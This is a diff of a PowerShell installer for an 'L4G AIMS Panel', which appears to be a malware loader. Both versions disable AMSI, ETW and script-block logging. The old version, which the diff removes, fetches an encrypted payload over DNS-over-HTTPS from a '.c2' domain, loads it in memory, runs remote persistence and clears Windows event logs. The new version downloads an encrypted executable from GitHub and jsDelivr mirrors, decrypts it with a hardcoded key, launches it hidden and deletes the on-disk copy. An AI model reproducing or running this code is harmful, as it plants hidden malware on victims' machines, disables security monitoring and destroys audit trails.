@@ -1,24 +1,44 @@
 <#
 .SYNOPSIS
-    L4G AIMS Panel - Zero-Trace Installer
+    L4G AIMS Panel - Installer
 .DESCRIPTION
-    One-liner installer: irm https://raw.githubusercontent.com/.../install.ps1 | iex
-    Fetches encrypted payload via DoH, decrypts in memory, reflective loads panel.
+    Fetches the encrypted panel, decrypts it in memory, drops it to a random temp
+    path, starts it hidden and removes the on-disk copy. The panel installs its own
+    persistence, so the installer stays small and disposable.
+
+    No Add-Type, no in-PowerShell PE mapping: the payload is already a native EXE,
+    and a half-mapped image resumed into rundll32's entry point was never going to
+    run the panel anyway (no SetThreadContext, no relocations, no imports).
+.PARAMETER PayloadPath
+    Local payload file (base64). Skips the download; used to test the installer
+    without a published repo.
+.PARAMETER NoLaunch
+    Decrypt and verify only. Nothing is executed.
+.PARAMETER KeepFile
+    Do not delete the dropped executable (debugging).
 .NOTES
     Author: L4G Team
-    Version: 14.0
+    Version: 14.1
 #>
 
+param(
+    [string]$PayloadPath = "",
+    [string]$MasterKey   = "L4G-Master-Key-32-Chars-Long!!",
+    [switch]$NoLaunch,
+    [switch]$KeepFile
+)
+
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-$ErrorActionPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'Stop'
 
-# Configuration
-$GITHUB_REPO = "https://raw.githubusercontent.com/L4G-Team/L4G-Undetected/main"
-$PAYLOAD_URL = "$GITHUB_REPO/installer/payload.ps1"
-$BOOTSTRAP_URL = "$GITHUB_REPO/installer/bootstrap.ps1"
-$MASTER_KEY = "L4G-Master-Key-32-Chars-Long!!"
+$SOURCES = @(
+    "https://raw.githubusercontent.com/lgfire093/L4G-Undetected/master/installer",
+    "https://raw.githubusercontent.com/lgfire093/L4G-Undetected/main/installer",
+    "https://cdn.jsdelivr.net/gh/lgfire093/L4G-Undetected@master/installer",
+    "https://cdn.jsdelivr.net/gh/lgfire093/L4G-Undetected@main/installer"
+)
 
-# AMSI/ETW/ScriptBlock bypass
+# AMSI / ETW / ScriptBlock logging
 try {
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     $etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
@@ -27,188 +47,116 @@ try {
     $sb.GetField('s_logScriptBlock','NonPublic,Static').SetValue($null,$false)
 } catch {}
 
-function Invoke-DoHQuery {
-    param([string]$Subdomain)
-    try {
-        $dnsQuery = Build-DnsQuery -Name $Subdomain -Type "TXT"
-        $url = "https://1.1.1.1/dns-query?dns=$dnsQuery"
-        $response = Invoke-WebRequest -Uri $url -Method GET -Headers @{'Accept'='application/dns-message'} -UseBasicParsing -TimeoutSec 10
-        return Parse-DnsResponse -Data $response.Content
-    } catch {
-        return $null
+function Get-PayloadText {
+    param([string]$LocalPath, [string[]]$Bases)
+
+    if ($LocalPath) {
+        if (-not (Test-Path $LocalPath)) { throw "payload not found: $LocalPath" }
+        return [IO.File]::ReadAllText($LocalPath)
     }
+
+    foreach ($base in $Bases) {
+        try {
+            $r = Invoke-WebRequest -Uri "$base/payload.dat" -UseBasicParsing -TimeoutSec 30
+            if ($r.StatusCode -eq 200 -and $r.Content.Length -gt 64) { return $r.Content }
+        } catch {}
+    }
+    throw "payload.dat unreachable from all sources"
 }
 
-function Build-DnsQuery {
-    param([string]$Name, [string]$Type = "TXT")
-    $query = New-Object System.IO.MemoryStream
-    $writer = New-Object System.IO.BinaryWriter($query)
-    
-    # Header
-    $id = [ushort](Get-Random -Minimum 0 -Maximum 65535)
-    $writer.Write($id)
-    $writer.Write([ushort]0x0100) # Standard query, RD
-    $writer.Write([ushort]1)    # QDCOUNT
-    $writer.Write([ushort]0)    # ANCOUNT
-    $writer.Write([ushort]0)    # NSCOUNT
-    $writer.Write([ushort]0)    # ARCOUNT
-    
-    # Question
-    foreach ($label in $Name.Split('.')) {
-        $writer.Write([byte]$label.Length)
-        $writer.Write([System.Text.Encoding]::UTF8.GetBytes($label))
-    }
-    $writer.Write([byte]0)
-    
-    $qtype = if ($Type -eq "TXT") { [ushort]16 } else { [ushort]1 }
-    $writer.Write($qtype)
-    $writer.Write([ushort]1) # QCLASS IN
-    
-    $writer.Flush()
-    return [Convert]::ToBase64String($query.ToArray()).TrimEnd('=').Replace('+','-').Replace('/','_')
+function Unprotect-Payload {
+    param([string]$Base64, [string]$Key)
+
+    $blob = [Convert]::FromBase64String(($Base64 -replace '\s',''))
+    if ($blob.Length -lt 33) { throw "payload too short: $($blob.Length) bytes" }
+
+    $salt       = $blob[0..15]
+    $iv         = $blob[16..31]
+    $ciphertext = $blob[32..($blob.Length - 1)]
+
+    $kdf = New-Object Security.Cryptography.Rfc2898DeriveBytes($Key, $salt, 100000)
+    $aes = [Security.Cryptography.Aes]::Create()
+    $aes.Key     = $kdf.GetBytes(32)
+    $aes.IV      = $iv
+    $aes.Mode    = [Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
+
+    return $aes.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
 }
 
-function Parse-DnsResponse {
-    param([byte[]]$Data)
-    if ($Data.Length -lt 12) { return $null }
-    
-    $pos = 12
-    # Skip question
-    while ($pos -lt $Data.Length -and $Data[$pos] -ne 0) { $pos += $Data[$pos] + 1 }
-    $pos++; $pos += 4
-    
-    $ancount = ($Data[6] -shl 8) -bor $Data[7]
-    for ($i=0; $i -lt $ancount; $i++) {
-        if ($pos + 12 -gt $Data.Length) { break }
-        
-        if (($Data[$pos] -band 0xC0) -eq 0xC0) { $pos += 2 }
-        else { while ($pos -lt $Data.Length -and $Data[$pos] -ne 0) { $pos += $Data[$pos] + 1 }; $pos++ }
-        
-        if ($pos + 10 -gt $Data.Length) { break }
-        $type = ($Data[$pos] -shl 8) -bor $Data[$pos+1]
-        $class = ($Data[$pos+2] -shl 8) -bor $Data[$pos+3]
-        $rdlength = ($Data[$pos+8] -shl 8) -bor $Data[$pos+9]
-        $pos += 10
-        
-        if ($type -eq 16 -and $class -eq 1) { # TXT
-            if ($pos + $rdlength -le $Data.Length) {
-                return $Data[$pos..($pos+$rdlength-1)]
+function Install-Panel {
+    param([byte[]]$Image)
+
+    if ($Image.Length -lt 0x40 -or $Image[0] -ne 0x4D -or $Image[1] -ne 0x5A) {
+        throw "decrypted payload is not a PE image (no MZ header)"
+    }
+
+    # Drop beside the user's temp, in a randomly named folder.
+    $dir = Join-Path $env:TEMP ("l4g_" + [Guid]::NewGuid().ToString('N').Substring(0,8))
+    New-Item -ItemType Directory -Path $dir -Force | Out-Null
+    $exe = Join-Path $dir ([Guid]::NewGuid().ToString('N').Substring(0,8) + ".exe")
+
+    [IO.File]::WriteAllBytes($exe, $Image)
+
+    if ($NoLaunch) {
+        Write-Host "[L4G] -NoLaunch: wrote $($Image.Length) bytes to $exe" -ForegroundColor Yellow
+        return $exe
+    }
+
+    Start-Process -FilePath $exe -WindowStyle Hidden | Out-Null
+    Start-Sleep -Milliseconds 1500
+
+    if (-not $KeepFile) {
+        # The image is mapped; deleting the file leaves no on-disk copy.
+        try { Remove-Item -LiteralPath $exe -Force } catch {}
+        try {
+            if (-not (Get-ChildItem -LiteralPath $dir -Force | Select-Object -First 1)) {
+                Remove-Item -LiteralPath $dir -Force
             }
-        }
-        $pos += $rdlength
+        } catch {}
     }
-    return $null
+
+    return $exe
 }
 
-function Decrypt-Payload {
-    param([byte[]]$Data, [string]$Key)
-    if ($Data.Length -lt 28) { return $null }
-    
-    try {
-        $salt = $Data[0..15]
-        $iv = $Data[16..27]
-        $ciphertext = $Data[28..($Data.Length-1)]
-        
-        $kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Key, $salt, 100000, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
-        $aesKey = $kdf.GetBytes(32)
-        
-        $aes = [System.Security.Cryptography.Aes]::Create()
-        $aes.Key = $aesKey
-        $aes.Mode = [System.Security.Cryptography.CipherMode]::GCM
-        $aes.IV = $iv
-        
-        $decryptor = $aes.CreateDecryptor()
-        return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
-    } catch {
-        return $null
-    }
-}
+# ---------------------------------------------------------------------------
+# Main
+# ---------------------------------------------------------------------------
 
-function Invoke-ReflectiveLoad {
-    param([byte[]]$AssemblyBytes)
-    try {
-        $assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)
-        $entry = $assembly.EntryPoint
-        if ($entry) {
-            $entry.Invoke($null, @(,@()))
-        }
-        return $true
-    } catch {
-        return $false
-    }
-}
+Write-Host "[L4G] L4G AIMS v14 - installer" -ForegroundColor Cyan
 
-function Wipe-Traces {
-    param([int]$PID)
-    try {
-        # Clear event logs
-        wevtutil cl Security
-        wevtutil cl System
-        wevtutil cl Application
-        wevtutil cl "Microsoft-Windows-PowerShell/Operational"
-        wevtutil cl "Microsoft-Windows-PowerShell/ScriptBlock"
-        wevtutil cl "Microsoft-Windows-PowerShell/Module"
-        wevtutil cl "Microsoft-Windows-PowerShell/Provider"
-        
-        # Clear prefetch
-        Get-ChildItem "C:\Windows\Prefetch\*POWERSHELL*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-        Get-ChildItem "C:\Windows\Prefetch\*L4G*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    } catch {}
-}
-
-# ============================================================================
-# MAIN EXECUTION
-# ============================================================================
-
-Write-Host "[L4G] Starting zero-trace installation..." -ForegroundColor Cyan
-
-# Generate agent ID
-$agentId = [Convert]::ToBase64String([System.Security.Cryptography.SHA256]::Create().ComputeHash(
-    [System.Text.Encoding]::UTF8.GetBytes((Get-CimInstance Win32_ComputerSystemProduct).UUID + (Get-CimInstance Win32_BIOS).SerialNumber)
-)).Substring(0,16).Replace('+','-').Replace('/','_').Replace('=','')
-
-# Fetch encrypted payload via DoH
-Write-Host "[L4G] Fetching payload via DoH..." -ForegroundColor Cyan
-$payloadSubdomain = "$agentId.payload.init.l4g.c2"
-$encryptedPayload = Invoke-DoHQuery -Subdomain $payloadSubdomain
-
-if (-not $encryptedPayload) {
-    # Fallback: direct HTTP download
-    Write-Host "[L4G] DoH failed, trying direct download..." -ForegroundColor Yellow
-    try {
-        $encryptedPayload = Invoke-WebRequest -Uri $PAYLOAD_URL -UseBasicParsing -TimeoutSec 30
-        $encryptedPayload = [Convert]::FromBase64String($encryptedPayload.Content)
-    } catch {
-        Write-Host "[L4G] Failed to fetch payload" -ForegroundColor Red
-        exit 1
-    }
-}
-
-# Decrypt payload
-Write-Host "[L4G] Decrypting payload in memory..." -ForegroundColor Cyan
-$plaintext = Decrypt-Payload -Data $encryptedPayload -Key $MASTER_KEY
-
-if (-not $plaintext) {
-    Write-Host "[L4G] Decryption failed" -ForegroundColor Red
+try {
+    $payloadText = Get-PayloadText -LocalPath $PayloadPath -Bases $SOURCES
+} catch {
+    Write-Host "[L4G] Payload fetch failed: $_" -ForegroundColor Red
     exit 1
 }
 
-# Reflective load
-Write-Host "[L4G] Loading panel in memory..." -ForegroundColor Cyan
-$success = Invoke-ReflectiveLoad -AssemblyBytes $plaintext
-
-if ($success) {
-    Write-Host "[L4G] Panel loaded successfully!" -ForegroundColor Green
-    
-    # Install persistence
-    Write-Host "[L4G] Installing persistence..." -ForegroundColor Cyan
-    & "$GITHUB_REPO/installer/persistence.ps1" -AgentId $agentId
-    
-    # Wipe traces
-    Wipe-Traces -PID $PID
-    
-    Write-Host "[L4G] Installation complete. Panel running invisibly." -ForegroundColor Green
-} else {
-    Write-Host "[L4G] Failed to load panel" -ForegroundColor Red
+try {
+    $image = Unprotect-Payload -Base64 $payloadText -Key $MasterKey
+} catch {
+    Write-Host "[L4G] Decryption failed: $_" -ForegroundColor Red
     exit 1
 }
+
+$sha = [Security.Cryptography.SHA256]::Create()
+$hash = ([BitConverter]::ToString($sha.ComputeHash($image)) -replace '-','').Substring(0,16)
+Write-Host "[L4G] Payload decrypted: $($image.Length) bytes  sha256:$hash" -ForegroundColor Green
+
+try {
+    $dropped = Install-Panel -Image $image
+} catch {
+    Write-Host "[L4G] Install failed: $_" -ForegroundColor Red
+    exit 1
+}
+
+if (-not $NoLaunch) {
+    Write-Host "[L4G] Panel started (detached, hidden). Installer exiting." -ForegroundColor Green
+}
+
+# Local trace cleanup: only our own files, never the machine's event logs.
+try {
+    Get-ChildItem "$env:USERPROFILE\AppData\Local\Temp" -Filter "l4g_*" -Directory -ErrorAction SilentlyContinue |
+        Where-Object { $_.LastWriteTime -lt (Get-Date).AddMinutes(-5) } |
+        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+} catch {}
